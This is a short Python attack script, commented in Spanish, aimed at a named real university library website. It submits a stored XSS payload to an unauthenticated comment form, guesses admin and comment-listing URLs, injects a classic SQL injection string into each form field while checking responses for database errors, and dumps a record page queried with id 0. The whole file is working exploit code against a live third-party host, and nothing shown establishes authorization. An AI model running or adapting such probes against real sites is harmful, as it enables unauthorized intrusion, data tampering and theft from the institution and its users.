import requests, urllib3, re
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {'User-Agent': 'Mozilla/5.0'}

print("="*60)
print("ANALISIS XSS: registra_comentario.asp (WRITE sin auth)")
print("="*60)

# Confirmar exactamente que el POST escribe en DB
# y si el contenido es visible en alguna pagina publica

# Test 1: Enviar comentario con XSS payload simple
xss_payload = '<script>alert(1)</script>'
data_xss = {
    'nombre': 'TEST_PENTEST_' + 'A'*5,
    'mail': 'pentest@uns.edu.pe',
    'pregunta': xss_payload
}
r = requests.post(BASE + '/registra_comentario.asp', data=data_xss,
                  headers={**h, 'Referer': BASE + '/registra_comentario.htm'},
                  verify=False, timeout=8, allow_redirects=True)
print(f"\n[XSS] POST con <script>: url={r.url}, status={r.status_code}")

# ¿Se puede leer de vuelta? Buscar endpoint que muestre comentarios
print("\n[+] Buscando donde se muestran los comentarios guardados:")
view_paths = [
    '/ver_comentarios.asp', '/comentarios.asp', '/listar_comentarios.asp',
    '/admin_comentarios.asp', '/comentarios_admin.asp', '/firmas.asp',
    '/libro_visitas.asp', '/mensajes.asp', '/sugerencias.asp',
    '/buzón.asp', '/buzon.asp',
]
for path in view_paths:
    try:
        r = requests.get(BASE + path, headers=h, verify=False, timeout=4, allow_redirects=False)
        if r.status_code != 404:
            print(f"  [{r.status_code}] {path}")
    except:
        pass

# Test 2: SQLi en nombre/mail/pregunta del comentario
print("\n[SQLi en campos de comentario]:")
for field in ['nombre', 'mail', 'pregunta']:
    data_sqli = {'nombre': 'test', 'mail': 'a@a.com', 'pregunta': 'test'}
    data_sqli[field] = "' OR '1'='1"
    r = requests.post(BASE + '/registra_comentario.asp', data=data_sqli,
                      headers={**h, 'Referer': BASE + '/registra_comentario.htm'},
                      verify=False, timeout=8, allow_redirects=True)
    text = r.text.lower()
    has_err = any(kw in text for kw in ['microsoft', 'odbc', 'syntax', 'oledb', '800a', 'jet', 'error'])
    print(f"  Campo '{field}' = SQLi -> url={r.url}, db_error={has_err}")

# Test 3: ver_libro.asp con idm=0 muestra todos los libros?
print("\n[LECTURA] ver_libro.asp?idm=0 (retorna 16508 bytes):")
r = requests.get(BASE + '/ver_libro.asp', params={'idm': '0'}, headers=h, verify=False, timeout=8)
clean = re.sub(r'<[^>]+>', ' ', r.text)
lines = [l.strip() for l in clean.splitlines() if l.strip()]
print(f"  Status: {r.status_code}, {len(r.content)}b")
print(f"  Contenido: {' | '.join(lines[18:35])}")
